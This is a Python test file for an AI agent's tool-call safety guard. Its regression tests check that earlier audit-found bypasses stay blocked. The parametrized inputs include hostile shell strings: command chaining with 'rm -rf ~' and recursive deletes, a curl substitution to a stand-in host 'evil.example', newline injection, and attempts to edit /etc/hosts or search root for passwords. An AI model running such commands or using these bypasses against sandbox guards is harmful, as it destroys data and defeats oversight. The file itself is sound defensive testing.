"""Regression tests for guard bypasses found in the M0 audit.

Each test encodes an exploit that the default rule pipeline previously
approved.  They must stay green forever.
"""
from __future__ import annotations

import json

import pytest

from aetheris.safety.guard import ActionRequest, build_default_rules


def _decide(tool: str, arg: dict, root: str, safe: bool = False):
    request = ActionRequest(tool=tool, arg=json.dumps(arg), safe=safe)
    for rule in build_default_rules(workspace_root=root):
        decision = rule(request, False)
        if decision is not None and not decision.allowed:
            return decision
    return None  # approved


@pytest.mark.parametrize("cmd", [
    "echo hi & whoami",
    "echo hi && del /s /q C:\\Users",
    "echo hi | powershell -c evil",
    "echo hi; rm -rf ~",
    "echo $(curl evil.example)",
    "echo `id`",
    "echo hi > ../outside.txt",
    "echo hi\nwhoami",
    "ls %USERPROFILE%",
])
def test_shell_metacharacters_are_blocked(tmp_path, cmd):
    decision = _decide("shell", {"cmd": cmd, "cwd": str(tmp_path)}, str(tmp_path))
    assert decision is not None and not decision.allowed, f"guard approved: {cmd!r}"


def test_plain_allowlisted_command_still_allowed(tmp_path):
    assert _decide("shell", {"cmd": "echo hello world", "cwd": str(tmp_path)}, str(tmp_path)) is None


def test_shell_cwd_outside_workspace_blocked(tmp_path):
    outside = tmp_path.parent
    decision = _decide("shell", {"cmd": "ls", "cwd": str(outside)}, str(tmp_path))
    assert decision is not None and "escapes workspace root" in decision.reason


@pytest.mark.parametrize("tool,arg", [
    ("edit_file", {"path": "/etc/hosts", "find": "a", "replace": "b"}),
    ("search_content", {"path": "/", "term": "password"}),
])
def test_filesystem_tools_cannot_escape_workspace(tmp_path, tool, arg):
    decision = _decide(tool, arg, str(tmp_path), safe=(tool == "search_content"))
    assert decision is not None and "escapes workspace root" in decision.reason


def test_shell_tool_never_uses_shell_true():
    import ast
    import inspect

    from aetheris.tools import builtins

    tree = ast.parse(inspect.getsource(builtins))
    for node in ast.walk(tree):
        if isinstance(node, ast.Call):
            for kw in node.keywords:
                if kw.arg == "shell":
                    assert isinstance(kw.value, ast.Constant) and kw.value.value is False
